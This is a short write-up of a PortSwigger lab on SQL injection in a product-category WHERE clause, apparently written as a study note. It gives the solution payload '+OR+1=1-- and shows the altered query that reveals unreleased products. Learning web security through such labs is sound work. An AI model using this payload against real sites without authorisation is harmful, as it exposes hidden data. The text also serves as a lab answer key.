# Lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
url: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

# Overview:
-This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
    SELECT * FROM products WHERE category = 'Gifts' AND released = 1
-To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

# Solution:
- Modify the parameter of category by adding '+OR+1=1--, the new SQL query then:
    SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
